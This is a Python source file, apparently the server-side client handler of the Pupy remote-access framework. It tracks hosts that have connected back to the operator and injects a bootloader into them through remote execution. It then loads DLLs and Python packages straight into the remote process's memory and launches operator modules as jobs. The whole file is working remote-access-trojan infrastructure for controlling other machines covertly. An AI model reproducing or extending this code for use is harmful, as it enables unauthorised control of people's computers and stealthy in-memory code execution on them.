# -*- coding: utf-8 -*-
# --------------------------------------------------------------
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# All rights reserved.
#
# Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met:
#
# 1. Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.
#
# 2. Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution.
#
# 3. Neither the name of the copyright holder nor the names of its contributors may be used to endorse or promote products derived from this software without specific prior written permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE
# --------------------------------------------------------------
import sys, os, os.path
import textwrap
import logging
import cPickle
from .PupyErrors import PupyModuleError
import traceback
import textwrap
from .PupyJob import PupyJob
import imp
import platform

import zlib

import msgpack

from threading import Lock

from pupylib.PupyCompile import pupycompile
from pupylib.payloads import dependencies
from pupylib.utils.rpyc_utils import obtain

ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), '..'))

class PupyClient(object):
    def __init__(self, desc, pupsrv):
        self.desc = desc
        #alias
        self.conn = self.desc["conn"]
        self.pupsrv = pupsrv
        self.imported_dlls = set()
        self.imported_modules = set()
        self.cached_modules = set()
        self.pupyimporter = None
        self.load_dll = False
        self.new_dlls = False
        self.new_modules = False
        self.remotes = {}
        self.remotes_lock = Lock()
        self.obtain_call = None

        self.load_pupyimporter()

        #to reuse impersonated handle in other modules
        self.impersonated_dupHandle = None

    def __str__(self):
        return "PupyClient(id=%s, user=%s, hostname=%s, platform=%s)"%(
            self.desc["id"], self.desc["user"],
            self.desc["hostname"], self.desc["platform"]
        )

    def __del__(self):
        del self.desc

    def get_conf(self):
        dic={}
        if "offline_script" in self.desc:
            dic["offline_script"]=self.desc["offline_script"]
        dic["launcher"]=self.desc["launcher"]
        dic["launcher_args"]=self.desc["launcher_args"]
        return dic

    def short_name(self):
        try:
            return '_'.join([
                self.desc["platform"][0:3].lower(),
                self.desc["hostname"],
                self.desc["macaddr"].replace(':','')
            ])

        except Exception:
            return "unknown"

    def node(self):
        return self.desc['macaddr'].replace(':', '').lower()

    def is_unix(self):
        return not self.is_windows()

    def is_posix(self):
        return self.desc['os_name'].lower() == 'posix'

    def is_linux(self):
        return "linux" in self.desc["platform"].lower()

    def is_java(self):
        return "java" in self.desc["platform"].lower()

    def is_android(self):
        return self.desc["platform"].lower()=="android"

    def is_windows(self):
        if "windows" in self.desc["platform"].lower():
            return True
        return False

    def is_solaris(self):
        return "sunos" in self.desc["platform"].lower()

    def is_darwin(self):
        if "darwin" in self.desc["platform"].lower():
            return True
        return False

    @property
    def platform(self):
        if self.is_android():
            return 'android'
        elif self.is_windows():
            return 'windows'
        elif self.is_linux():
            return 'linux'
        elif self.is_darwin():
            return 'darwin'
        elif self.is_solaris():
            return 'solaris'
        elif self.is_unix():
            return 'unix'

    @property
    def os_arch(self):
        arch = self.desc['os_arch'].lower()
        substitute = {
            'x86_64': 'amd64',
            'i386': 'x86',
            'i686': 'x86',
            'i486': 'x86',
        }
        return substitute.get(arch, arch)

    @property
    def arch(self):
        os_arch_to_platform = {
            'amd64': 'intel',
            'x86': 'intel',
            'i86pc': 'sun-intel',
            'armv7l': 'arm',
            'aarch64': 'arm',
        }

        os_platform_to_arch = {
            'intel': {
                '32bit': 'x86',
                '64bit': 'amd64'
            },
            'sun-intel': {
                # Yes.. Just one arch supported
                # The script is for amd64
                '32bit': 'i86pc',
                '64bit': 'i86pc'
            },
            'arm': {
                '32bit': 'arm',
                '64bit': 'aarch64'
            }
        }

        if self.os_arch in os_arch_to_platform:
            return os_platform_to_arch[
                os_arch_to_platform[self.os_arch]
            ][self.desc['proc_arch']]
        else:
            return None

    def is_proc_arch_64_bits(self):
        if "64" in self.desc["proc_arch"]:
            return True
        return False

    def match_server_arch(self):
        try:
            return all([
                self.desc['platform']==platform.system(),
                self.desc['proc_arch']==platform.architecture()[0],
                self.desc['os_arch']==platform.machine()
            ])

        except Exception as e:
            logging.error(e)
        return False

    def remote(self, module, function=None, need_obtain=True):
        remote_module = None
        remote_function = None

        with self.remotes_lock:
            if module in self.remotes:
                remote_module = self.remotes[module]['_']
            else:
                remote_module = getattr(self.conn.modules, module)
                self.remotes[module] = {
                    '_': remote_module
                }

            if function:
                if function in self.remotes[module]:
                    remote_function = self.remotes[module][function]
                else:
                    remote_function = getattr(self.conn.modules[module], function)
                    self.remotes[module][function] = remote_function

        if function and need_obtain:
            if self.obtain_call:
                return lambda *args, **kwargs: self.obtain_call(remote_function, *args, **kwargs)
            else:
                return lambda *args, **kwargs: obtain(remote_function(*args, **kwargs))

        elif function:
            return remote_function

        else:
            return remote_module

    def remote_const(self, module, variable):
        remote_module = None
        remote_variable = None

        with self.remotes_lock:
            if module in self.remotes:
                remote_module = self.remotes[module]['_']
            else:
                remote_module = getattr(self.conn.modules, module)
                self.remotes[module] = {
                    '_': remote_module
                }

            if variable in self.remotes[module]:
                remote_variable = self.remotes[module][variable]
            else:
                remote_variable = obtain(getattr(self.conn.modules[module], variable))
                self.remotes[module][variable] = remote_variable

        return remote_variable

    def load_pupyimporter(self):
        """ load pupyimporter in case it is not """
        if not self.conn.modules.sys.modules.has_key('pupyimporter'):
            self.conn.execute('\n'.join([
                'import imp, sys, marshal',
                'mod = imp.new_module("pupyimporter")',
                'mod.__file__="<bootloader>/pupyimporter"',
                'exec marshal.loads({}) in mod.__dict__'.format(
                    repr(pupycompile(
                        os.path.join(ROOT, 'packages', 'all', 'pupyimporter.py'),
                        'pupyimporter.py', path=True, raw=True))),
                'sys.modules["pupyimporter"]=mod',
                'mod.install()']))

        self.pupyimporter = self.remote('pupyimporter')

        if self.conn.register_remote_cleanup:
            self.conn.register_remote_cleanup(self.pupyimporter.unregister_package_request_hook)
            self.pupyimporter.register_package_request_hook(self.remote_load_package)
            self.conn.register_remote_cleanup(self.pupyimporter.unregister_package_error_hook)
            self.pupyimporter.register_package_error_hook(self.remote_print_error)

        self.load_dll = getattr(self.pupyimporter, 'load_dll', None)
        self.new_dlls = getattr(self.pupyimporter, 'new_dlls', None)
        self.new_modules = getattr(self.pupyimporter, 'new_modules', None)

        if self.conn.obtain_call:
            def obtain_call(function, *args, **kwargs):
                if args or kwargs:
                    packed_args = msgpack.dumps((args, kwargs))
                    packed_args = zlib.compress(packed_args)
                else:
                    packed_args = None

                result = self.conn.obtain_call(function, packed_args)
                result = zlib.decompress(result)
                result = msgpack.loads(result)

                return result

            self.obtain_call = obtain_call

        if self.obtain_call:
            self.imported_modules = set(self.obtain_call(self.conn.modules.sys.modules.keys))
            self.cached_modules = set(self.obtain_call(self.pupyimporter.modules.keys))
        else:
            self.imported_modules = set(obtain(self.conn.modules.sys.modules.keys()))
            self.cached_modules = set(obtain(self.pupyimporter.modules.keys()))


    def load_dll(self, path):
        """
            load some dll from memory like sqlite3.dll needed for some .pyd to work
            Don't load pywintypes27.dll and pythoncom27.dll with this. Use load_package("pythoncom") instead
        """
        name = os.path.basename(path)
        if name in self.imported_dlls:
            return False

        buf = dependencies.dll(name, self.platform, self.arch)
        if not buf:
            raise ImportError('Shared object {} not found'.format(name))

        if self.load_dll:
            result = self.load_dll(name, buf)
        else:
            result = self.conn.modules.pupy.load_dll(name, buf)

        if not result:
            raise ImportError('Couldn\'t load shared object {}'.format(name))
        else:
            self.imported_dlls.add(name)

        return True

    def filter_new_modules(self, modules, dll, force=None, remote=False):
        if force is None:
            modules = set(
                x for x in modules if not x in self.imported_modules
            )

            modules = set(
                module for module in modules if not any(
                    cached_module.startswith(
                        tuple(x.format(module.replace('.', '/')) for x in (
                            '{}.py', '{}/__init__.py', '{}.pyd', '{}.so',
                        ))
                    ) for cached_module in self.cached_modules
                )
            )

        if not modules:
            return []

        if remote:
            return modules

        if dll:
            if self.new_dlls:
                return self.new_dlls(modules)
            else:
                return [
                    module for module in modules if not module in self.imported_dlls
                ]
        else:
            if self.new_modules:
                new_modules = self.new_modules(modules)
            else:
                new_modules = [
                    module for module in modules if not self.pupyimporter.has_module(module)
                ]

            for module in modules:
                if not module in new_modules:
                    self.imported_modules.add(module)

            if not force is None:
                for module in modules:
                    if not module in new_modules:
                        force.add(module)

                return modules
            else:
                return new_modules

    def load_package(self, requirements, force=False, remote=False, new_deps=[]):
        try:
            forced = None
            if force:
                forced = set()

            packages, contents, dlls = dependencies.package(
                requirements, self.platform, self.arch, remote=remote,
                posix=self.is_posix(),
                filter_needed_cb=lambda modules, dll: self.filter_new_modules(
                    modules, dll, forced, remote
                )
            )

            self.cached_modules.update(contents)

        except dependencies.NotFoundError, e:
            raise ValueError('Module not found: {}'.format(e))

        if remote:
            return packages, dlls

        if not contents and not dlls:
            return False

        if dlls:
            if self.load_dll:
                for name, blob in dlls:
                    self.pupyimporter.load_dll(name, blob)
            else:
                for name, blob in dlls:
                    self.conn.modules.pupy.load_dll(name, blob)

            if not contents:
                return True

        if not contents:
            return False

        if forced:
            with self.remotes_lock:
                for module in forced:
                    self.pupyimporter.invalidate_module(module)
                    if module in self.remotes:
                        del self.remotes[module]

        self.pupyimporter.pupy_add_package(
            packages,
            compressed=True,
            # Use None to prevent import-then-clean-then-search behavior
            name=(
                None if type(requirements) != str else requirements
            )
        )

        new_deps.extend(contents)
        return True

    def unload_package(self, module_name):
        if not module_name.endswith(('.so', '.dll', '.pyd')):
            self.pupyimporter.invalidate_module(module_name)

    def remote_load_package(self, module_name):
        logging.debug('remote_load_package for {} started'.format(module_name))

        try:
            return self.load_package(module_name, remote=True)

        except dependencies.NotFoundError:
            logging.debug('remote_load_package for {} failed'.format(module_name))
            return None, None

        finally:
            logging.debug('remote_load_package for {} completed'.format(module_name))


    def remote_print_error(self, msg):
        self.pupsrv.handler.display_warning(msg)

    def run_module(self, module_name, args):
        """ start a module on this unique client and return the corresponding job """
        module_name=self.pupsrv.get_module_name_from_category(module_name)
        mod=self.pupsrv.get_module(module_name)
        if not mod:
            raise Exception("unknown module %s !"%modargs.module)
        pj=None
        modjobs=[x for x in self.pupsrv.jobs.itervalues() if x.pupymodules[0].get_name() == mod.get_name() and x.pupymodules[0].client==self]
        if mod.daemon and mod.unique_instance and modjobs:
            pj=modjobs[0]
        else:
            pj=PupyJob(self.pupsrv,"%s %s"%(module_name, args))
            ps=mod(self, pj)
            pj.add_module(ps)
            self.pupsrv.add_job(pj)
        pj.start(args)
        return pj
